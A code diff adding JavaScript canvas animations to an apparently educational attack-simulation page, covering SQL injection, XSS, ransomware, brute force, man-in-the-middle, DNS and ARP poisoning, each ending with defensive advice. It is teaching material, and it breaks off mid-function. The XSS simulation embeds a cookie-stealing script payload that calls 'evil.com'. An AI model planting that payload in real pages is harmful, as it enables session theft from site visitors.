+            ctx.fillStyle='rgba(0,0,0,0.3)'; ctx.fillRect(boxX,65,boxW,50);
+            ctx.fillStyle='#8892a8'; ctx.font='10px monospace'; ctx.textAlign='left';
+            ctx.fillText("SELECT * FROM users WHERE name=",boxX+8,84);
+            ctx.fillStyle='#ff3b3b'; ctx.fillText(`'${dp}'`,boxX+8+ctx.measureText("SELECT * FROM users WHERE name=").width,84);
+            ctx.fillStyle='#39ff14'; ctx.font='9px monospace';
+            ctx.fillText('AUTH BYPASSED',boxX+8,103);
+        }
+
+        if(frame>100){
+            const ty=130;
+            ctx.fillStyle='rgba(0,240,255,0.05)'; ctx.strokeStyle='rgba(0,240,255,0.15)'; ctx.lineWidth=1;
+            ctx.beginPath(); ctx.roundRect(boxX,ty,boxW,25+Math.min(extractedRows.length,5)*22,6); ctx.fill(); ctx.stroke();
+            ctx.fillStyle='#00f0ff'; ctx.font='bold 10px monospace'; ctx.textAlign='left';
+            ctx.fillText('DATABASE DUMP — users table',boxX+10,ty+16);
+            extractedRows.slice(-5).forEach((row,i)=>{
+                ctx.fillStyle=i%2===0?'rgba(255,59,59,0.1)':'transparent'; ctx.fillRect(boxX,ty+20+i*22,boxW,22);
+                ctx.fillStyle='#e8ecf4'; ctx.font='9px monospace';
+                ctx.fillText(row,boxX+10,ty+33+i*22);
+            });
+            if(frame%40===0&&extractedRows.length<records.length){
+                extractedRows.push(records[extractedRows.length]);
+                termLog(`> Record extracted: ${records[extractedRows.length-1].split('|')[0].trim()}`,'error');
+                if(extractedRows.length===1)activateStep(3);
+                if(extractedRows.length===records.length)activateStep(4);
+            }
+        }
+
+        if(frame%15===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=Math.min(500,frame*2);
+            if(e1)e1.textContent=Math.min(150,frame);
+            if(e2)e2.textContent=(extractedRows.length*10000).toLocaleString();
+            if(e3)e3.textContent=Math.min(24,extractedRows.length*5);
+            setProgress(Math.min(100,(frame/300)*100));
+        }
+        if(frame>=300){setProgress(100);termLog('> Full DB extracted. Use parameterized queries!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 4. XSS ────────────────────────────────────────────────────────────── */
+window.simulateXSS = function() {
+    termLog('> Injecting malicious script into comment field...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    const scriptCode = '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>';
+    let frame=0, victimsHit=0;
+    const floatingCookies=[];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Script stored in database — persistent XSS.','error');},800);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Victim browses page — script executes in browser.','error');},1600);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+
+        const bW=Math.min(560,w-20), bX=(w-bW)/2, bY=10;
+        ctx.fillStyle='rgba(20,25,40,0.95)'; ctx.strokeStyle='rgba(139,92,246,0.25)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(bX,bY,bW,h-20,8); ctx.fill(); ctx.stroke();
+
+        ctx.fillStyle='rgba(139,92,246,0.1)'; ctx.fillRect(bX,bY,bW,28);
+        ctx.fillStyle='#8892a8'; ctx.font='10px monospace'; ctx.textAlign='left';
+        ctx.fillText('https://vulnerable-forum.com/post/42',bX+10,bY+17);
+
+        const cY=bY+42;
+        ctx.fillStyle='rgba(255,255,255,0.03)'; ctx.strokeStyle='rgba(139,92,246,0.2)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(bX+10,cY,bW-20,45,4); ctx.fill(); ctx.stroke();
+        ctx.fillStyle='#525c70'; ctx.font='9px monospace'; ctx.fillText('Add a comment:',bX+16,cY-5);
+
+        const revealed=scriptCode.slice(0,Math.min(scriptCode.length,Math.floor(frame/2)));
+        ctx.fillStyle='#ff3b3b'; ctx.font='10px monospace';
+        ctx.fillText(revealed,bX+14,cY+20);
+
+        if(frame>60){
+            ctx.fillStyle='rgba(255,59,59,0.08)'; ctx.beginPath(); ctx.roundRect(bX+10,cY,bW-20,45,4); ctx.fill();
+            ctx.fillStyle='#ff3b3b'; ctx.font='bold 9px monospace';
+            ctx.fillText('MALICIOUS SCRIPT STORED IN DATABASE',bX+14,cY+38);
+        }
+
+        if(frame>100){
+            const vY=cY+60;
+            ctx.fillStyle='#8892a8'; ctx.font='10px monospace';
+            ctx.fillText('Active Sessions (Script running in their browsers):',bX+10,vY);
+            for(let i=0;i<Math.min(victimsHit,8);i++){
+                const row=Math.floor(i/4),col=i%4;
+                const vx=bX+10+col*((bW-20)/4), vy=vY+12+row*28;
+                ctx.fillStyle='rgba(139,92,246,0.12)'; ctx.strokeStyle='rgba(139,92,246,0.35)'; ctx.lineWidth=1;
+                ctx.beginPath(); ctx.roundRect(vx,vy,(bW-28)/4,20,3); ctx.fill(); ctx.stroke();
+                ctx.fillStyle='#8b5cf6'; ctx.font='8px monospace'; ctx.textAlign='left';
+                ctx.fillText(`user_${i+1}`,vx+5,vy+13);
+            }
+            if(frame%35===0&&victimsHit<20){
+                victimsHit++;
+                floatingCookies.push({x:bX+rnd(60,bW-60),y:vY+55,vy:-1.5,alpha:1});
+                activateStep(3);
+                termLog(`> Session cookie exfiltrated from user_${victimsHit}`,'error');
+            }
+        }
+
+        floatingCookies.forEach(c=>{
+            c.y+=c.vy; c.alpha-=0.01;
+            ctx.globalAlpha=Math.max(0,c.alpha);
+            ctx.fillStyle='#8b5cf6'; ctx.font='10px monospace'; ctx.textAlign='center';
+            ctx.fillText('cookie=>evil.com',c.x,c.y);
+            ctx.globalAlpha=1;
+        });
+
+        if(frame%20===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=Math.min(5, Math.floor(frame/70) + 1);
+            if(e1)e1.textContent=victimsHit;
+            if(e2)e2.textContent=victimsHit;
+            if(e3)e3.textContent=victimsHit;
+            setProgress(Math.min(100,(frame/350)*100));
+        }
+        if(frame===250){activateStep(4);termLog('> Accounts compromised via stolen sessions!','error');}
+        if(frame>=350){setProgress(100);termLog('> Simulation done. Implement CSP headers!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 5. RANSOMWARE ─────────────────────────────────────────────────────── */
+window.simulateRansomware = function() {
+    termLog('> Malware initializing... contacting C2 server.', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    const files=['documents/tax_return.pdf','documents/contracts.docx','photos/family.jpg','database/customers.sql','projects/main.py','projects/config.env','finance/payroll.xlsx','backups/server.tar','keys/rsa_private.pem','reports/annual.pdf','desktop/passwords.txt','videos/presentation.mp4'];
+    let frame=0, encryptedCount=0;
+    const fileStates=files.map(f=>({name:f,encrypted:false,progress:0}));
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> C2 response: AES-256 key received.','error');},700);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Scanning filesystem — 48,000 files found.','warning');},1400);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(3);termLog('> Encryption started. AES-256 + RSA-2048.','error');},2100);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.98)'; ctx.fillRect(0,0,w,h);
+        ctx.fillStyle='#ff3b3b'; ctx.font='bold 13px monospace'; ctx.textAlign='center';
+        ctx.fillText('RANSOMWARE — ENCRYPTING YOUR FILES',w/2,24);
+
+        const cols=Math.ceil(Math.sqrt(files.length)), bW=(w-30)/cols, bH=22;
+        fileStates.forEach((file,idx)=>{
+            const col=idx%cols, row=Math.floor(idx/cols);
+            const fx=15+col*bW, fy=40+row*(bH+4);
+            if(frame>60+idx*20&&!file.encrypted){
+                file.progress=Math.min(1,file.progress+0.03);
+                if(file.progress>=1){file.encrypted=true;encryptedCount++;if(encryptedCount===1)termLog(`> Encrypted: ${file.name}`,'error');}
+            }
+            ctx.fillStyle=file.encrypted?'rgba(255,59,59,0.12)':file.progress>0?'rgba(255,170,0,0.08)':'rgba(255,255,255,0.02)';
+            ctx.strokeStyle=file.encrypted?'rgba(255,59,59,0.3)':'rgba(255,255,255,0.05)';
+            ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(fx,fy,bW-3,bH,3); ctx.fill(); ctx.stroke();
+            if(file.progress>0&&!file.encrypted){ctx.fillStyle='rgba(255,170,0,0.3)';ctx.beginPath();ctx.roundRect(fx,fy,(bW-3)*file.progress,bH,3);ctx.fill();}
+            const icon=file.encrypted?'🔒':file.progress>0?'⚙':'📄';
+            ctx.fillStyle=file.encrypted?'#ff3b3b':file.progress>0?'#ffaa00':'#8892a8';
+            ctx.font='8px monospace'; ctx.textAlign='left';
+            ctx.fillText(`${icon} ${file.name.split('/').pop()}`,fx+4,fy+15);
+        });
+
+        if(encryptedCount>=files.length-1){
+            const noteY=40+Math.ceil(files.length/cols)*(bH+4)+8;
+            if(noteY<h-80){
+                ctx.fillStyle='rgba(255,59,59,0.1)'; ctx.strokeStyle='rgba(255,59,59,0.4)'; ctx.lineWidth=2;
+                ctx.beginPath(); ctx.roundRect(10,noteY,w-20,70,6); ctx.fill(); ctx.stroke();
+                ctx.fillStyle='#ff3b3b'; ctx.font='bold 12px monospace'; ctx.textAlign='center';
+                ctx.fillText('YOUR FILES HAVE BEEN ENCRYPTED',w/2,noteY+18);
+                ctx.fillStyle='#e8ecf4'; ctx.font='10px monospace';
+                ctx.fillText('Send 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf...',w/2,noteY+36);
+                ctx.fillStyle='#ffaa00'; ctx.fillText('YOU HAVE 72 HOURS TO PAY THE RANSOM',w/2,noteY+54);
+                activateStep(4);
+            }
+        }
+
+        if(frame%20===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=(encryptedCount*4000).toLocaleString();
+            if(e1)e1.textContent=`${(encryptedCount*0.6).toFixed(1)} GB`;
+            if(e2)e2.textContent=`$${(encryptedCount*1200).toLocaleString()}`;
+            if(e3)e3.textContent=`${Math.round(frame/60)}s`;
+            setProgress(Math.min(100,(frame/400)*100));
+        }
+        if(frame>=400){setProgress(100);termLog('> Simulation done. Maintain offline backups!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 6. BRUTE FORCE ────────────────────────────────────────────────────── */
+window.simulateBruteForce = function() {
+    termLog('> Loading dictionary: rockyou.txt (14M passwords)', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    const passwords=['password','123456','admin','letmein','qwerty','welcome','monkey','dragon','1234567890','iloveyou','sunshine','master','football','shadow','pass@123','abc123','superman','111111','princess','michael'];
+    let frame=0, attempts=0, cracked=0;
+    const SPEED=2000;
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Dictionary loaded. Starting automated attack.','warning');},600);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Hydra firing at SSH port 22 @ 2000 req/s...','error');},1200);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        attempts+=60;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        const boxW=Math.min(580,w-20), boxX=(w-boxW)/2;
+        ctx.fillStyle='rgba(255,170,0,0.05)'; ctx.strokeStyle='rgba(255,170,0,0.2)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(boxX,12,boxW,36,6); ctx.fill(); ctx.stroke();
+        ctx.fillStyle='#8892a8'; ctx.font='10px monospace'; ctx.textAlign='left';
+        ctx.fillText('TARGET: ssh root@192.168.1.1:22  |  Tool: Hydra v9.4',boxX+12,34);
+
+        for(let i=0;i<10;i++){
+            const pwdIdx=(Math.floor(attempts/60)+i*7)%passwords.length;
+            const pwd=passwords[pwdIdx];
+            const ay=58+i*22;
+            const found=(frame>200&&i===5&&cracked===1)||(frame>280&&i===3&&cracked===2);
+            ctx.fillStyle=found?'rgba(57,255,20,0.15)':'rgba(255,255,255,0.02)'; ctx.fillRect(boxX,ay,boxW,20);
+            ctx.fillStyle=found?'#39ff14':'#525c70'; ctx.font='10px monospace'; ctx.textAlign='left';
+            ctx.fillText(`[${String(attempts+i*7).padStart(8,'0')}] root:${pwd}`,boxX+8,ay+13);
+            ctx.fillStyle=found?'#39ff14':'#ff3b3b'; ctx.textAlign='right';
+            ctx.fillText(found?'SUCCESS':'FAILED',boxX+boxW-8,ay+13);
+            ctx.textAlign='left';
+        }
+
+        if(frame===200&&cracked===0){cracked++;activateStep(3);termLog('> PASSWORD FOUND: root:password123 — SSH access!','success');}
+        if(frame===280&&cracked===1){cracked++;termLog('> PASSWORD FOUND: admin:admin — Admin panel!','success');}
+        if(frame===320){activateStep(4);termLog('> Unauthorized SSH session established!','error');}
+
+        const meterY=h-55, meterW=Math.min(400,w-40), meterX=(w-meterW)/2;
+        const fillPct=Math.min(1,0.7+Math.sin(frame*0.1)*0.1);
+        ctx.fillStyle='rgba(255,170,0,0.1)'; ctx.strokeStyle='rgba(255,170,0,0.3)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(meterX,meterY,meterW,16,4); ctx.fill(); ctx.stroke();
+        const grad=ctx.createLinearGradient(meterX,0,meterX+meterW,0);
+        grad.addColorStop(0,'#39ff14'); grad.addColorStop(0.6,'#ffaa00'); grad.addColorStop(1,'#ff3b3b');
+        ctx.fillStyle=grad; ctx.beginPath(); ctx.roundRect(meterX,meterY,meterW*fillPct,16,4); ctx.fill();
+        ctx.fillStyle='#fff'; ctx.font='bold 10px monospace'; ctx.textAlign='center';
+        ctx.fillText(`${Math.round(SPEED*fillPct)} req/s`,w/2,meterY+12);
+
+        if(frame%15===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=Math.min(1000000,attempts).toLocaleString();
+            if(e1)e1.textContent=Math.round(SPEED*fillPct).toLocaleString();
+            if(e2)e2.textContent=Math.max(0,attempts-cracked).toLocaleString();
+            if(e3)e3.textContent=cracked;
+            setProgress(Math.min(100,(frame/380)*100));
+        }
+        if(frame>=380){setProgress(100);termLog('> Simulation done. Use MFA + account lockout!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 7. MAN-IN-THE-MIDDLE ──────────────────────────────────────────────── */
+window.simulateMitM = function() {
+    termLog('> Initiating ARP spoofing on local network...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    const victim={x:w*0.15,y:h/2,icon:'💻',label:'VICTIM'};
+    const gateway={x:w*0.85,y:h/2,icon:'🌐',label:'GATEWAY'};
+    const attacker={x:w/2,y:h*0.18,icon:'😈',label:'ATTACKER'};
+
+    let frame=0, intercepted=0;
+    const packets=[];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Attacker positioned between victim and gateway.','warning');},800);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Intercepting HTTP traffic — plaintext visible!','error');},1600);
+
+    function drawNode(node,color,glow){
+        if(glow){ctx.shadowBlur=20;ctx.shadowColor=color;}
+        ctx.beginPath(); ctx.arc(node.x,node.y,26,0,Math.PI*2);
+        ctx.fillStyle=`${color}20`; ctx.fill();
+        ctx.strokeStyle=color; ctx.lineWidth=2; ctx.stroke();
+        ctx.shadowBlur=0;
+        ctx.fillStyle=color; ctx.font='18px Arial'; ctx.textAlign='center'; ctx.textBaseline='middle';
+        ctx.fillText(node.icon,node.x,node.y-4);
+        ctx.font='bold 9px monospace'; ctx.textBaseline='top';
+        ctx.fillText(node.label,node.x,node.y+30);
+    }
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        const mitm=frame>50;
+        if(mitm){
+            [[victim,attacker],[attacker,gateway]].forEach(([a,b])=>{
+                ctx.beginPath(); ctx.setLineDash([6,4]); ctx.moveTo(a.x,a.y); ctx.lineTo(b.x,b.y);
+                ctx.strokeStyle='rgba(255,59,59,0.55)'; ctx.lineWidth=1.5; ctx.stroke(); ctx.setLineDash([]);
+            });
+        }else{
+            ctx.beginPath(); ctx.moveTo(victim.x,victim.y); ctx.lineTo(gateway.x,gateway.y);
+            ctx.strokeStyle='rgba(59,130,246,0.35)'; ctx.lineWidth=1; ctx.stroke();
+        }
+
+        drawNode(victim,'#3b82f6',false);
+        drawNode(gateway,'#39ff14',false);
+        drawNode(attacker,'#ff3b3b',mitm);
+
+        if(frame%25===0&&mitm){
+            const isRet=Math.random()>0.5;
+            packets.push({from:isRet?gateway:victim,to:attacker,p:0,data:['GET /login HTTP/1.1','POST /bank/transfer','Authorization: Bearer xyz'][rndInt(0,3)]});
+        }
+
+        packets.forEach(pkt=>{
+            pkt.p+=0.025;
+            const px=pkt.from.x+(pkt.to.x-pkt.from.x)*pkt.p, py=pkt.from.y+(pkt.to.y-pkt.from.y)*pkt.p;
+            ctx.beginPath(); ctx.arc(px,py,5,0,Math.PI*2);
+            ctx.fillStyle=`rgba(255,59,59,${1-pkt.p*0.5})`; ctx.fill();
+            if(pkt.p>=1){intercepted++;activateStep(3);termLog(`> Intercepted: ${pkt.data}`,'error');}
+        });
+        packets.splice(0,packets.filter(p=>p.p>=1).length);
+
+        if(frame>80){
+            const py=h*0.6;
+            ctx.fillStyle='rgba(255,59,59,0.05)'; ctx.strokeStyle='rgba(255,59,59,0.15)'; ctx.lineWidth=1;
+            ctx.beginPath(); ctx.roundRect(w/2-150,py,300,95,6); ctx.fill(); ctx.stroke();
+            ctx.fillStyle='#ff3b3b'; ctx.font='bold 9px monospace'; ctx.textAlign='center';
+            ctx.fillText('CAPTURED CREDENTIALS',w/2,py+14);
+            ['username=alice&password=hunter2','Authorization: Basic YWxpY2U6aHVudGVyMg==','Cookie: session=eyJhbGciOi...'].slice(0,Math.min(3,Math.floor(frame/80))).forEach((d,i)=>{
+                ctx.fillStyle='#8892a8'; ctx.font='8px monospace'; ctx.fillText(d,w/2,py+30+i*18);
+            });
+        }
+
+        if(frame===240){activateStep(4);termLog('> SSL stripping: HTTPS downgraded to HTTP!','error');}
+
+        if(frame%15===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=(intercepted*1000).toLocaleString();
+            if(e1)e1.textContent=Math.floor(intercepted/8);
+            if(e2)e2.textContent=`${(intercepted*0.05).toFixed(1)} MB`;
+            if(e3)e3.textContent=Math.floor(intercepted/12);
+            setProgress(Math.min(100,(frame/350)*100));
+        }
+        if(frame>=350){setProgress(100);termLog('> Simulation done. Always use HTTPS + VPN!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 8. ZERO-DAY EXPLOIT ───────────────────────────────────────────────── */
+window.simulateZeroDay = function() {
+    termLog('> Zero-day CVE detected — no patch available.', 'error');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, exploited=0, systemsAtRisk=0;
+    const cols=Math.ceil(Math.sqrt(120)), bW=(w-40)/cols, bH=18;
+    const memBlocks=[];
+    for(let i=0;i<120;i++){
+        memBlocks.push({x:20+(i%cols)*bW,y:40+Math.floor(i/cols)*(bH+3),w:bW-2,h:bH,state:'safe',label:`0x${(i*64).toString(16).padStart(4,'0').toUpperCase()}`,timer:rndInt(60,240)});
+    }
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Exploit payload crafted — targeting heap overflow.','error');},700);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Watering hole deployed. 2M systems exposed.','warning');},1500);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+        ctx.fillStyle='#ff00aa'; ctx.font='bold 11px monospace'; ctx.textAlign='center';
+        ctx.fillText('MEMORY MAP — HEAP OVERFLOW EXPLOIT',w/2,22);
+
+        memBlocks.forEach(block=>{
+            if(frame>block.timer&&block.state==='safe'){block.state='corrupted';exploited++;}
+            if(block.state==='corrupted'&&frame>block.timer+30)block.state='pwned';
+            const color=block.state==='safe'?'rgba(57,255,20,0.6)':block.state==='corrupted'?'rgba(255,170,0,0.8)':'rgba(255,0,170,0.9)';
+            ctx.fillStyle=block.state==='safe'?'rgba(57,255,20,0.04)':block.state==='corrupted'?'rgba(255,170,0,0.12)':'rgba(255,0,170,0.18)';
+            ctx.strokeStyle=color; ctx.lineWidth=1;
+            ctx.beginPath(); ctx.roundRect(block.x,block.y,block.w,block.h,2); ctx.fill(); ctx.stroke();
+            ctx.fillStyle=color; ctx.font='7px monospace'; ctx.textAlign='left';
+            ctx.fillText(block.label,block.x+2,block.y+11);
+            if(block.state==='pwned'){ctx.fillStyle='#ff00aa'; ctx.fillText('PWN',block.x+block.w-25,block.y+11);}
+        });
+
+        systemsAtRisk=Math.min(2000000,frame*3000);
+        if(frame===150){activateStep(3);termLog('> System compromised — root shell obtained!','error');}
+        if(frame===240){activateStep(4);termLog('> Backdoor installed — persistent access established.','error');}
+
+        if(frame%20===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent='9.8 / 10';
+            if(e1)e1.textContent=systemsAtRisk.toLocaleString();
+            if(e2)e2.textContent=frame > 200 ? '1 (emergency)' : '0';
+            if(e3)e3.textContent=`${Math.max(10, 200 - Math.round(frame/2))} days avg`;
+            setProgress(Math.min(100,(frame/320)*100));
+        }
+        if(frame>=320){setProgress(100);termLog('> Simulation done. Patch immediately!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 9. DNS SPOOFING ───────────────────────────────────────────────────── */
+window.simulateDNSSpoofing = function() {
+    termLog('> Targeting DNS resolver — cache poisoning attack...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, forgedPkts=0, poisoned=0, redirected=0;
+    const packets=[], domains=['bank.com','paypal.com','mail.google.com','corp-vpn.com','login.microsoft.com'], poisonedDomains=[];
+
+    const resolver={x:w/2,y:h/2,label:'DNS RESOLVER'};
+    const victimN={x:w*0.1,y:h/2,label:'VICTIM'};
+    const realSvr={x:w*0.9,y:h*0.3,label:'REAL SERVER'};
+    const fakeSvr={x:w*0.9,y:h*0.7,label:'EVIL SERVER'};
+    const attackerN={x:w*0.45,y:h*0.1,label:'ATTACKER'};
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Flooding resolver with forged DNS responses.','error');},700);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> DNS cache POISONED — traffic redirecting!','error');},1400);
+
+    function node(n,color){
+        ctx.beginPath(); ctx.arc(n.x,n.y,20,0,Math.PI*2);
+        ctx.fillStyle=`${color}18`; ctx.fill(); ctx.strokeStyle=color; ctx.lineWidth=2; ctx.stroke();
+        ctx.fillStyle=color; ctx.font='8px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
+        ctx.fillText(n.label,n.x,n.y+22);
+    }
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        [[victimN,resolver,'#3b82f630'],[resolver,realSvr,'#39ff1430'],[resolver,fakeSvr,frame>80?'#ff3b3b55':'#ff3b3b11'],[attackerN,resolver,'#ff3b3b35']].forEach(([a,b,c])=>{
+            ctx.beginPath(); ctx.moveTo(a.x,a.y); ctx.lineTo(b.x,b.y); ctx.strokeStyle=c; ctx.lineWidth=1; ctx.stroke();
+        });
+
+        node(resolver,'#39ff14'); node(victimN,'#3b82f6'); node(realSvr,'#39ff14'); node(fakeSvr,'#ff3b3b'); node(attackerN,'#ff3b3b');
+
+        if(frame%8===0&&frame<300){packets.push({x:attackerN.x,y:attackerN.y,tx:resolver.x,ty:resolver.y,p:0,evil:true});forgedPkts++;}
+        if(frame>120&&frame%50===0){poisoned++;poisonedDomains.push(domains[rndInt(0,domains.length)]);packets.push({x:victimN.x,y:victimN.y,tx:resolver.x,ty:resolver.y,p:0,evil:false});activateStep(3);}
+        if(frame>200&&frame%70===0){redirected++;activateStep(4);termLog(`> ${poisonedDomains[rndInt(0,poisonedDomains.length)]} → EVIL SERVER!`,'error');}
+
+        packets.forEach(pkt=>{
+            pkt.p+=0.04;
+            const px=pkt.x+(pkt.tx-pkt.x)*pkt.p, py=pkt.y+(pkt.ty-pkt.y)*pkt.p;
+            ctx.beginPath(); ctx.arc(px,py,pkt.evil?4:5,0,Math.PI*2);
+            ctx.fillStyle=`rgba(255,59,59,${(1-pkt.p)*0.9})`; ctx.fill();
+        });
+        packets.splice(0,packets.filter(p=>p.p>=1).length);
+
+        if(poisonedDomains.length>0){
+            const cy=h*0.62;
+            ctx.fillStyle='rgba(57,255,20,0.04)'; ctx.strokeStyle='rgba(57,255,20,0.15)'; ctx.lineWidth=1;
+            ctx.beginPath(); ctx.roundRect(w/2-130,cy,260,14+poisonedDomains.length*14,4); ctx.fill(); ctx.stroke();
+            ctx.fillStyle='#39ff14'; ctx.font='bold 8px monospace'; ctx.textAlign='center';
+            ctx.fillText('POISONED CACHE',w/2,cy+10);
+            poisonedDomains.slice(-4).forEach((d,i)=>{
+                ctx.fillStyle='#ff3b3b'; ctx.font='8px monospace'; ctx.fillText(`${d} → 10.0.0.66 EVIL`,w/2,cy+22+i*14);
+            });
+        }
+
+        if(frame%20===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=forgedPkts.toLocaleString();
+            if(e1)e1.textContent=poisoned;
+            if(e2)e2.textContent=(redirected*15000).toLocaleString();
+            if(e3)e3.textContent=`${Math.max(0, 300 - frame)}s`;
+            setProgress(Math.min(100,(frame/350)*100));
+        }
+        if(frame>=350){setProgress(100);termLog('> Simulation done. Enable DNSSEC!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 10. ARP POISONING ─────────────────────────────────────────────────── */
+window.simulateARPPoison = function() {
+    termLog('> Scanning LAN for ARP table targets...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, arpSent=0, poisoned=0;
+    const arpPackets=[];
+    const hosts=[
+        {x:w*0.1,y:h*0.3,label:'Host A\n192.168.1.10',color:'#3b82f6'},
+        {x:w*0.1,y:h*0.7,label:'Host B\n192.168.1.20',color:'#39ff14'},
+        {x:w*0.5,y:h*0.5,label:'GATEWAY\n192.168.1.1',color:'#8b5cf6'},
+        {x:w*0.9,y:h*0.5,label:'ATTACKER\n192.168.1.99',color:'#ff3b3b',evil:true},
+    ];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Gratuitous ARP flood initiated...','error');},700);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> ARP cache updated on victim hosts!','error');},1500);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        hosts.slice(0,3).forEach((ha,ii)=>{
+            hosts.slice(0,3).filter(hb=>hb!==ha).forEach(hb=>{
+                ctx.beginPath(); ctx.moveTo(ha.x,ha.y); ctx.lineTo(hb.x,hb.y);
+                ctx.strokeStyle='rgba(255,255,255,0.04)'; ctx.lineWidth=1; ctx.stroke();
+            });
+        });
+
+        if(frame>40){
+            [hosts[0],hosts[1]].forEach(v=>{
+                ctx.beginPath(); ctx.setLineDash([5,5]); ctx.moveTo(hosts[3].x,hosts[3].y); ctx.lineTo(v.x,v.y);
+                ctx.strokeStyle='rgba(255,59,59,0.45)'; ctx.lineWidth=1.5; ctx.stroke(); ctx.setLineDash([]);
+            });
+        }
+
+        hosts.forEach(host=>{
+            ctx.shadowBlur=host.evil?18:0; ctx.shadowColor=host.color;
+            ctx.beginPath(); ctx.arc(host.x,host.y,22,0,Math.PI*2);
+            ctx.fillStyle=`${host.color}18`; ctx.fill();
+            ctx.strokeStyle=host.color; ctx.lineWidth=2; ctx.stroke(); ctx.shadowBlur=0;
+            ctx.fillStyle=host.color; ctx.font='8px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
+            host.label.split('\n').forEach((l,i)=>ctx.fillText(l,host.x,host.y+24+i*11));
+        });
+
+        if(frame%15===0&&frame<300){
+            const target=frame%30===0?hosts[0]:hosts[1];
+            arpPackets.push({x:hosts[3].x,y:hosts[3].y,tx:target.x,ty:target.y,p:0});
+            arpSent++;
+        }
+
